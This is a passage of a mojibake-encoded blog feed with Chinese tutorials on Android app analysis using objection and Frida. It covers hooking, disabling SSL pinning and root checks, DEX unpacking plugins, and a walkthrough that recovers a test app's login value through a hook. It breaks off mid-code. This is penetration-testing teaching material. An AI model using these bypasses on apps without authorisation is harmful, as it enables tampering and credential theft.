id="å†…å­˜å †ä¸Šæœç´¢å®ä¾‹"><a href="#å†…å­˜å †ä¸Šæœç´¢å®ä¾‹" class="headerlink" title="å†…å­˜å †ä¸Šæœç´¢å®ä¾‹"></a>å†…å­˜å †ä¸Šæœç´¢å®ä¾‹</h3><p>ä»ç”¨ä¾‹ä»£ç å¯çŸ¥ï¼Œè¿è¡ŒAPPè¿›å…¥ MainActivity åä¼šåˆ›å»º3ä¸ªCarå¯¹è±¡ï¼Œæ­¤æ—¶å¦‚æœæƒ³æŸ¥çœ‹å†…å­˜ä¸­çš„Carå®ä¾‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android heap search instances com.zyc.objectiondemo.Car</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101338985.jpeg" alt="img"> </p><h3 id="è°ƒç”¨å®ä¾‹çš„æ–¹æ³•"><a href="#è°ƒç”¨å®ä¾‹çš„æ–¹æ³•" class="headerlink" title="è°ƒç”¨å®ä¾‹çš„æ–¹æ³•"></a>è°ƒç”¨å®ä¾‹çš„æ–¹æ³•</h3><p>æœç´¢åˆ°å®ä¾‹è·å–åœ°å€åå¯è°ƒç”¨å…¶æ–¹æ³•ã€‚å¦‚æœè¦è°ƒç”¨å®ä¾‹1çš„ <strong>show()</strong> æ–¹æ³•ï¼Œè¿è¡Œï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android heap execute 68389604 show</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101339473.jpeg" alt="img"> </p><h3 id="å®æ—¶æ³¨å…¥å®ä¾‹"><a href="#å®æ—¶æ³¨å…¥å®ä¾‹" class="headerlink" title="å®æ—¶æ³¨å…¥å®ä¾‹"></a>å®æ—¶æ³¨å…¥å®ä¾‹</h3><p>æ‹¿åˆ°å®ä¾‹åå¯ä»¥ç›´æ¥åœ¨å®ä¾‹ä¸Šä¹¦å†™jsæ³¨å…¥ï¼Œè¿è¡Œ</p><p>android heap evaluate 23973990 ä¼šè¿›å…¥jsç¼–è¾‘å™¨ï¼Œå¯ä»¥å®æ—¶ç¼–å†™ã€æ³¨å…¥ã€è°ƒè¯•ï¼Œä½†æ²¡æœ‰ä»£ç æç¤ºã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101358116.jpeg" alt="img"> </p><h3 id="å¯¼å…¥hookä»£ç "><a href="#å¯¼å…¥hookä»£ç " class="headerlink" title="å¯¼å…¥hookä»£ç "></a>å¯¼å…¥hookä»£ç </h3><p>objectionæ”¯æŒå¯¼å…¥Hook jsæ–‡ä»¶ä½¿ç”¨ï¼Œæ¯”å¦‚ &#x2F;root&#x2F;Desktop&#x2F;objectionHook.js æœ‰ä¸‹é¢Hookä»£ç ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hook start...&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Car</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.objectiondemo.Car&quot;</span>);</span><br><span class="line">        <span class="title class_">Car</span>.<span class="property">show</span>.<span class="title function_">overload</span>(<span class="string">&quot;int&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg1</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hook show...&quot;</span> + arg1);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">show</span>(arg1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(<span class="title function_">main</span>())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œimport &#x2F;root&#x2F;Desktop&#x2F;objectionHook.jså°±å¯ä»¥åœ¨objectionä¸­ç›´æ¥ä½¿ç”¨äº†ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101359725.gif" alt="img"> </p><h3 id="hookä¸€ä¸ªç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•"><a href="#hookä¸€ä¸ªç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•" class="headerlink" title="hookä¸€ä¸ªç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•"></a>hookä¸€ä¸ªç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•</h3><p>è¿è¡Œandroid hooking watch class com.zyc.objectiondemo.Carå¯ä»¥Hookåˆ°Carç±»ä¸‹æ‰€æœ‰æ–¹æ³•ï¼ˆä¸åŒ…æ‹¬æ„é€ æ–¹æ³•ï¼‰çš„è°ƒç”¨ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking watch class com.zyc.objectiondemo.Car</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101407098.gif" alt="img"> </p><h3 id="hookä¸€ä¸ªç±»ä¸­çš„å•ä¸ªæ–¹æ³•"><a href="#hookä¸€ä¸ªç±»ä¸­çš„å•ä¸ªæ–¹æ³•" class="headerlink" title="hookä¸€ä¸ªç±»ä¸­çš„å•ä¸ªæ–¹æ³•"></a>hookä¸€ä¸ªç±»ä¸­çš„å•ä¸ªæ–¹æ³•</h3><p>å¦‚æœåªéœ€è¦Hookå•ä¸ªæ–¹æ³•ï¼ˆåŒ…æ‹¬å…¶é‡è½½ï¼‰ï¼Œæ¯”å¦‚ä¸Šé¢æ²¡æœ‰Hookåˆ°çš„Carç±»æ„é€ å‡½æ•°ï¼Œå¯ä»¥è¿è¡Œï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking watch class_method com.zyc.objectiondemo.Car.$initã€‚</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101407323.gif" alt="img"> </p><p>å¦‚æœä¸éœ€è¦Hookæ–¹æ³•çš„é‡è½½ï¼Œå¯ä»¥åœ¨æ–¹æ³•ååé¢åŠ ä¸Šå‚æ•°ç±»å‹:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking watch class_method com.zyc.objectiondemo.Car.$init &quot;int,java.lang.String&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101408286.gif" alt="img"> </p><p>æŒ‡ä»¤æœ«å°¾åŠ ä¸Šå¯¹åº”é€‰é¡¹å¯ä»¥<strong>å±•ç¤ºå‚æ•°ã€è¿”å›å€¼å’Œè°ƒç”¨æ ˆ</strong>ï¼Œè¿è¡Œ:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking watch class_method com.zyc.objectiondemo.Car.show --dump-args --dump-return --dump-backtrace</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101408751.gif" alt="img"> </p><h3 id="å…³é—­SSLPinningæ£€æµ‹"><a href="#å…³é—­SSLPinningæ£€æµ‹" class="headerlink" title="å…³é—­SSLPinningæ£€æµ‹"></a>å…³é—­SSLPinningæ£€æµ‹</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android sslpinning disable</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101409638.png" alt="image.png"> </p><h3 id="å…³é—­appçš„rootæ ¡éªŒ"><a href="#å…³é—­appçš„rootæ ¡éªŒ" class="headerlink" title="å…³é—­appçš„rootæ ¡éªŒ"></a>å…³é—­appçš„rootæ ¡éªŒ</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android root disable        </span><br></pre></td></tr></table></figure><h3 id="å°è¯•æ¨¡æ‹Ÿrootç¯å¢ƒ"><a href="#å°è¯•æ¨¡æ‹Ÿrootç¯å¢ƒ" class="headerlink" title="å°è¯•æ¨¡æ‹Ÿrootç¯å¢ƒ"></a>å°è¯•æ¨¡æ‹Ÿrootç¯å¢ƒ</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android root simulate</span><br></pre></td></tr></table></figure><h2 id="ç³»ç»Ÿä»»åŠ¡jobs"><a href="#ç³»ç»Ÿä»»åŠ¡jobs" class="headerlink" title="ç³»ç»Ÿä»»åŠ¡jobs"></a>ç³»ç»Ÿä»»åŠ¡jobs</h2><p>objectionå¯ä»¥åŒæ—¶è¿è¡Œå¤šé¡¹ä»»åŠ¡ï¼Œæ¯”å¦‚ä¸‹å›¾åˆ›å»ºHookä»»åŠ¡æ—¶æ‰“å°äº†ä»»åŠ¡id 629342ï¼Œé€šè¿‡æŒ‡ä»¤jobs listèƒ½æŸ¥çœ‹å½“å‰è¿ä½œçš„ä»»åŠ¡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jobs list</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101411380.jpeg" alt="img"> </p><p>å¯ä»¥é€šè¿‡idç»“æŸæŸé¡¹ä»»åŠ¡ï¼Œè¿è¡Œjobs kill 629342ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jobs kill 629342</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101411103.jpeg" alt="img"> </p><h1 id="0x03-objectionæ‰¹é‡trace"><a href="#0x03-objectionæ‰¹é‡trace" class="headerlink" title="0x03 objectionæ‰¹é‡trace"></a>0x03 objectionæ‰¹é‡trace</h1><p>è¦å®ç°å¯¹APPä¸­çš„æ‰€æœ‰ç±»è¿›è¡Œhookï¼Œéœ€è¦æ€ä¹ˆåšå‘¢ï¼Ÿï¼Ÿï¼Ÿ</p><p>1ã€å…ˆæŸ¥æ‰¾APPä¸­çš„æ‰€æœ‰ç±»</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking search classes com.zj.wuaipojie</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101418481.png" alt="image.png"> </p><p>2ã€å°†è¿™8ä¸ªç±»å¤åˆ¶ä¸‹æ¥ï¼Œæ”¾åˆ°txtä¸­</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101419352.png" alt="image.png"> </p><p>3ã€ç»™è¿™äº›ç±»å‰é¢æ‰¹é‡æ·»åŠ å­—ç¬¦ä¸² â€œandroid hooking watch classâ€</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101419369.png" alt="image.png"> </p><p>4ã€ä½¿ç”¨å‘½ä»¤å¯¹æ‰€æœ‰ç±»è¿›è¡Œhook</p><p>åœ¨åˆšå¼€å§‹é™„åŠ è¿›ç¨‹çš„æ—¶å€™ï¼Œä½¿ç”¨å‚æ•° -c</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objection -g com.zj.wuaipojie -d explore -c 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101419683.png" alt="image.png"> </p><h1 id="0x04-Wallbreakeræ’ä»¶"><a href="#0x04-Wallbreakeræ’ä»¶" class="headerlink" title="0x04 Wallbreakeræ’ä»¶"></a>0x04 Wallbreakeræ’ä»¶</h1><p><a href="https://github.com/hluwa/Wallbreaker">Wallbreaker</a>æ˜¯ä¸€ä¸ªå®æ—¶åˆ†æ Java å †çš„æœ‰ç”¨å·¥å…·ï¼Œç”±fridaæä¾›æ”¯æŒã€‚æä¾›ä¸€äº›å‘½ä»¤ä»å†…å­˜ä¸­æœç´¢å¯¹è±¡æˆ–ç±»ï¼Œå¹¶ç²¾ç¾åœ°å¯è§†åŒ–ç›®æ ‡çš„çœŸå®ç»“æ„ã€‚</p><p>1ã€ä¸‹è½½å®‰è£…</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p ~/.objection/plugins/</span><br><span class="line">git clone https://github.com/hluwa/Wallbreaker ~/.objection/plugins/Wallbreaker</span><br></pre></td></tr></table></figure><p>2ã€åŠ è½½</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ç¬¬ä¸€ç§æ–¹æ³•ï¼š</span><br><span class="line">objection -g com.example.androiddemo explore  -P ~/.objection/plugins</span><br><span class="line"># ç¬¬äºŒç§æ–¹æ³•ï¼š</span><br><span class="line">objection -g com.example.androiddemo explore</span><br><span class="line">plugin load ~/.objection/plugins/Wallbreaker</span><br></pre></td></tr></table></figure><p>3ã€å‘½ä»¤ä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æœç´¢ç±»</span><br><span class="line">plugin wallbreaker objectsearch LoginActivity</span><br><span class="line">//è¿”å›ï¼š</span><br><span class="line">com.example.androiddemo.Activity.LoginActivity</span><br><span class="line">com.example.androiddemo.Activity.LoginActivity$1</span><br><span class="line"> </span><br><span class="line"># æ ¹æ®ç±»åæœç´¢å†…å­˜ä¸­å·²ç»è¢«åˆ›å»ºçš„å®ä¾‹ï¼Œåˆ—å‡º handle å’Œ toString() çš„ç»“æœ --fullname æ‰“å°å®Œæ•´çš„åŒ…å</span><br><span class="line">plugin wallbreaker classdump com.example.androiddemo.Activity.LoginActivity --fullname</span><br><span class="line"> </span><br><span class="line"># æœç´¢å¯¹è±¡</span><br><span class="line">plugin wallbreaker objectsearch com.example.androiddemo.Activity.LoginActivity</span><br><span class="line">//è¿”å›ï¼š</span><br><span class="line">[0x2262]: com.example.androiddemo.Activity.LoginActivity@d8a5160</span><br><span class="line"> </span><br><span class="line"># æŸ¥çœ‹å¯¹è±¡çš„ä¸€äº›å±æ€§å’Œæ–¹æ³•</span><br><span class="line">plugin wallbreaker objectdump 0x2262 --fullname</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101422586.png" alt="img"> </p><h1 id="0x05-FRIDA-DEXDump-è„±å£³æ’ä»¶"><a href="#0x05-FRIDA-DEXDump-è„±å£³æ’ä»¶" class="headerlink" title="0x05 FRIDA-DEXDump è„±å£³æ’ä»¶"></a>0x05 FRIDA-DEXDump è„±å£³æ’ä»¶</h1><p><a href="https://github.com/hluwa/FRIDA-DEXDump">frida-dexdump</a> ï¼šå¿«é€Ÿçš„ä»å†…å­˜ä¸­æœç´¢å’Œè½¬å­˜DEX</p><p>1ã€å®‰è£…</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/hluwa/FRIDA-DEXDump ~/.objection/plugins/dexdump</span><br></pre></td></tr></table></figure><p>2ã€å¯åŠ¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plugin dexdump dump</span><br></pre></td></tr></table></figure><p>3ã€è¿”å›å€¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[DEXDump]: DexSize=0x1d1f50, DexMd5=7ed584af40ef0b1bc211688395e92c98,SavePath=/root/.objection/plugins/com.example.androidemo/0x7e38c0201c.de</span><br></pre></td></tr></table></figure><h1 id="0x06-watch-events-æ’ä»¶"><a href="#0x06-watch-events-æ’ä»¶" class="headerlink" title="0x06 watch_events æ’ä»¶"></a>0x06 watch_events æ’ä»¶</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/hluwa/objection-plugins ~/.objection/plugins  --recurse-submodules</span><br><span class="line"> </span><br><span class="line">objection -g com.app.name explore -P ~/.objection/plugins</span><br><span class="line"> </span><br><span class="line">è¿™é‡Œå®‰è£…æˆåŠŸåï¼Œä¹Ÿä¼šè‡ªåŠ¨åŠ è½½ wallbreaker ã€dexdump</span><br></pre></td></tr></table></figure><p>å¼€å¯åï¼Œç‚¹å‡»å±å¹•æŒ‰é’®ï¼Œæ¯”å¦‚è¿™é‡Œæˆ‘æäº¤äº†ç™»å½•æŒ‰é’®ï¼Œæ‰“å°å‡ºæ¥å®ƒçš„ç±»ï¼Œå®ç°äº†å¿«é€Ÿå®šä½ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plugin watch_event onclick</span><br><span class="line"> </span><br><span class="line">com.example.androiddemo on (google: 8.1.0) [usb] # (agent) [WatchEvent] onClick: </span><br><span class="line">com.example.androiddemo.Activity.LoginActivity$1</span><br></pre></td></tr></table></figure><h1 id="0x07-objectionå®æˆ˜åˆ†æåŠ å¯†å‚æ•°"><a href="#0x07-objectionå®æˆ˜åˆ†æåŠ å¯†å‚æ•°" class="headerlink" title="0x07 objectionå®æˆ˜åˆ†æåŠ å¯†å‚æ•°"></a>0x07 objectionå®æˆ˜åˆ†æåŠ å¯†å‚æ•°</h1><p>1ã€ç›®æ ‡</p><p>æ­¤æ¬¡æ¼”ç¤ºçš„APPæ˜¯ä¸€ä¸ªé€šè¿‡æµ‹è¯•çš„APPï¼Œè¿™é‡Œæˆ‘ä»¬å°±ä¸å†™ä¸€è¡Œä»£ç ï¼Œä¹Ÿä¸ç”¨åç¼–è¯‘å·¥å…·åˆ†æä»£ç ï¼Œå…¨ç¨‹ç”¨objectionæ¥åˆ†æã€‚é€šå…³ç¬¬ä¸€å…³ç™»å½•ã€‚</p><p>2ã€åˆ†æ</p><p>æ­¤æ¬¡åˆ†æçš„ç›®çš„æ‰¾åˆ°å½“å‰ç™»å½•é¡µé¢çš„ç±»ã€‚android hooking list activities</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101431946.png" alt="img"> </p><p>3ã€hookè¿™ä¸ªç±»</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101431240.png" alt="img"> </p><p>4ã€æäº¤æŒ‰é’®,å¾—åˆ°è¿”å›å€¼ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101431745.png" alt="img"> </p><p>5.å°†å¾—åˆ°è¿”å›å€¼ </p><p>2f02e24ae2e1fe880399f27600afa88364e6062bf9bbe114b32fa8f23d03608a è¾“å…¥å¯†ç æ¡†ä¸­æäº¤ä»£ç ï¼Œå‘ç°æˆåŠŸé€šè¿‡ç¬¬ä¸€å…³ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell input text &#x27;2f02e24ae2e1fe880399f27600afa88364e6062bf9bbe114b32fa8f23d03608a&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> objection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆå§‹Frida</title>
      <link href="/2024/07/09/%E5%88%9D%E5%A7%8Bfrida/"/>
      <url>/2024/07/09/%E5%88%9D%E5%A7%8Bfrida/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x01-Fridaå®‰è£…-ç¯å¢ƒ"><a href="#0x01-Fridaå®‰è£…-ç¯å¢ƒ" class="headerlink" title="0x01 Fridaå®‰è£…&amp;ç¯å¢ƒ"></a>0x01 Fridaå®‰è£…&amp;ç¯å¢ƒ</h1><h2 id="Fridaå®‰è£…"><a href="#Fridaå®‰è£…" class="headerlink" title="Fridaå®‰è£…"></a>Fridaå®‰è£…</h2><p>å¯ä»¥å‚è€ƒ<code>objection</code>ä½¿ç”¨é‚£èŠ‚ï¼Œé‡Œé¢æœ‰æåˆ°Fridaçš„å®‰è£…ã€‚</p><h2 id="Fridaä»£ç ç¼–å†™ç¯å¢ƒ"><a href="#Fridaä»£ç ç¼–å†™ç¯å¢ƒ" class="headerlink" title="Fridaä»£ç ç¼–å†™ç¯å¢ƒ"></a>Fridaä»£ç ç¼–å†™ç¯å¢ƒ</h2><p>åœ¨ç³»ç»Ÿé‡Œè£…ä¸Šè¿™ä¸ªnpmåŒ…ï¼Œå¯ä»¥åœ¨ä»»æ„å·¥ç¨‹ä¸­è·å¾—fridaçš„ä»£ç æç¤ºã€è¡¥å…¨å’ŒAPIæŸ¥çœ‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm i -g @type/frida-gum</span><br></pre></td></tr></table></figure><p>æ–°å»ºä¸€ä¸ªæ–‡ä»¶æµ‹è¯•ï¼Œå‘ç°å°±å¯ä»¥æˆåŠŸæŸ¥çœ‹æç¤ºã€è¡¥å…¨ç­‰æ“ä½œäº†:</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407121048560.png" alt="image.png"> </p><h2 id="Fridaå¸¸ç”¨å‘½ä»¤"><a href="#Fridaå¸¸ç”¨å‘½ä»¤" class="headerlink" title="Fridaå¸¸ç”¨å‘½ä»¤"></a>Fridaå¸¸ç”¨å‘½ä»¤</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407121048532.png" alt="image.png"> </p><p><strong>1ã€æŸ¥çœ‹ç‰ˆæœ¬</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frida --version</span><br></pre></td></tr></table></figure><p><strong>2ã€æŸ¥çœ‹å®‰å“è¿›ç¨‹pid</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure><p><strong>3ã€ç«¯å£è½¬å‘</strong></p><p>1ï¼‰ ç¬¬ä¸€ä¸ªtcp:ç”µè„‘ç«¯å£</p><p>2ï¼‰ç¬¬äºŒä¸ªtcp:æ‰‹æœºç«¯å£</p><p>å°†PCç«¯çš„27042ç«¯å£æ”¶åˆ°çš„æ•°æ®ï¼Œè½¬å‘ç»™åˆ°æ‰‹æœºä¸­27042ç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb forward tcp:27042 tcp:27042</span><br></pre></td></tr></table></figure><p><strong>4ã€æ³¨å…¥JSè„šæœ¬</strong></p><p>1ï¼‰  -U å(åŒ…å|è¿›ç¨‹pid| -F æ³¨å…¥æœ€å‰ç«¯çš„APP)</p><p>2ï¼‰ -l å(æ–‡ä»¶è·¯å¾„)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frida -U com.android.xxx -l D:\NodeProjects\Demo\Hook.js</span><br></pre></td></tr></table></figure><p><strong>5ã€hookå¯åŠ¨å‰app</strong></p><p>1ï¼‰ -U -f å(åŒ…åï¼‰</p><p>2ï¼‰-l å(æ–‡ä»¶è·¯å¾„)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frida -U -f com.xxx.xxx -l D:\NodeProjects\Demo\Hook.js --no-pause</span><br></pre></td></tr></table></figure><p><strong>6ã€APPæŒ‚èµ·çš„æ–¹å¼åˆ›å»ºè¿›ç¨‹</strong></p><p>1ï¼‰-U -f å(åŒ…å)</p><p> 2ï¼‰ -l å(æ–‡ä»¶è·¯å¾„)</p><p>æç¤º Spawned <code>com.xiaojianbang.app</code>. Use %resume to let the main thread start executing!</p><p>å°±å¯ä»¥æ‰§è¡Œæ³¨å…¥ç­‰ç­‰,%resume æ¢å¤è¿›ç¨‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frida -U -f com.xxx.xxx -l D:\NodeProjects\Demo\Hook.js</span><br></pre></td></tr></table></figure><p><strong>7ã€æ¢å¤æŒ‚èµ·çš„è¿›ç¨‹</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%resume</span><br></pre></td></tr></table></figure><h1 id="0x02-Fridaå¸¸ç”¨API"><a href="#0x02-Fridaå¸¸ç”¨API" class="headerlink" title="0x02 Fridaå¸¸ç”¨API"></a>0x02 Fridaå¸¸ç”¨API</h1><h2 id="1-Fridaè®¿é—®æ–¹æ³•åŠå˜é‡"><a href="#1-Fridaè®¿é—®æ–¹æ³•åŠå˜é‡" class="headerlink" title="1. Fridaè®¿é—®æ–¹æ³•åŠå˜é‡"></a>1. Fridaè®¿é—®æ–¹æ³•åŠå˜é‡</h2><ul><li>æ–¹æ³•è°ƒç”¨<ul><li>é™æ€æ–¹æ³•ä½¿ç”¨<code>Java.use</code>è·å¾—<strong>ç±»</strong>åç›´æ¥è°ƒç”¨</li><li>éé™æ€æ–¹æ³•éœ€è¦ä½¿ç”¨<code>Java.choose</code>æŸ¥æ‰¾åˆ°<strong>ç±»å®ä¾‹</strong>åè¿›è¡Œè°ƒç”¨</li><li>æ„é€ æ–¹æ³•ä¸º<code>$init</code></li><li>å¯¹äºå†…éƒ¨ç±»ï¼Œé€šè¿‡<code>ç±»å$å†…éƒ¨ç±»å</code>å»useæˆ–è€…choose</li></ul></li><li>é™æ€&#x2F;éé™æ€å˜é‡<ul><li>è®¾ç½®æˆå‘˜å˜é‡çš„å€¼ï¼Œå†™æ³•æ˜¯<code>[field_name].value = [value]</code>ï¼Œå…¶ä»–æ–¹é¢å’Œå‡½æ•°ä¸€æ ·ã€‚</li><li>å¦‚æœæœ‰ä¸€ä¸ªæˆå‘˜å˜é‡å’Œæˆå‘˜å‡½æ•°çš„åå­—ç›¸åŒï¼Œåˆ™åœ¨å…¶å‰é¢åŠ ä¸€ä¸ª<code>_</code>ï¼Œå¦‚<code>_[field_name].value = [value]</code></li></ul></li></ul><h3 id="é™æ€æ–¹æ³•è°ƒç”¨Java-use"><a href="#é™æ€æ–¹æ³•è°ƒç”¨Java-use" class="headerlink" title="é™æ€æ–¹æ³•è°ƒç”¨Java.use"></a>é™æ€æ–¹æ³•è°ƒç”¨Java.use</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="comment">// å…ˆæŸ¥æ‰¾HookedObjectç±»ï¼Œç„¶åhookå…¶çš„stringTwoæ–¹æ³•</span></span><br><span class="line">            <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.forgotten.fridatestapp.HookedObject&quot;</span>).<span class="property">stringTwo</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg</span>) &#123;</span><br><span class="line">              <span class="comment">// thisä¸ºå½“å‰å®ä¾‹ï¼Œè·å¾—åŸæ–¹æ³•æ‰§è¡Œçš„ç»“æœ</span></span><br><span class="line">              <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">stringTwo</span>(arg);</span><br><span class="line">              <span class="comment">// æ‰“å°å‚æ•°å’ŒåŸæ–¹æ³•ç»“æœ</span></span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;stringTwo arg,result: &quot;</span>, arg, result);</span><br><span class="line">              <span class="comment">// å¯¹æ–¹æ³•çš„ç»“æœè¿›è¡Œä¿®æ”¹ï¼ˆç›¸å½“äºé‡å†™äº†è¯¥æ–¹æ³•ï¼‰</span></span><br><span class="line">              <span class="keyword">return</span> <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;hhello&quot;</span>);</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// hook addNumberæ–¹æ³• functionå‚æ•°åˆ—è¡¨å¯ä»¥ä»€ä¹ˆéƒ½ä¸å¡«</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.forgotten.fridatestapp.HookedObject&quot;</span>).<span class="property">addNumber</span>.<span class="title function_">overload</span>(<span class="string">&quot;int&quot;</span>, <span class="string">&quot;int&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="comment">// å†…ç½®æœ‰å˜é‡[argument]ï¼Œä¸ºæ–¹æ³•çš„å‚æ•°åˆ—è¡¨</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addNumber arguments[&quot;</span> + i + <span class="string">&quot;]=&quot;</span> + <span class="variable language_">arguments</span>[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">addNumber</span>(<span class="variable language_">arguments</span>[<span class="number">0</span>], <span class="variable language_">arguments</span>[<span class="number">1</span>]);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addNumber arg,result: &quot;</span>, <span class="variable language_">arguments</span>, result);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">99</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Fridaä¸€é™„åŠ ä¸Šï¼Œå°±æ‰§è¡Œå‡½æ•°</span></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><h3 id="éé™æ€æ–¹æ³•è°ƒç”¨Java-choose"><a href="#éé™æ€æ–¹æ³•è°ƒç”¨Java-choose" class="headerlink" title="éé™æ€æ–¹æ³•è°ƒç”¨Java.choose"></a>éé™æ€æ–¹æ³•è°ƒç”¨Java.choose</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span 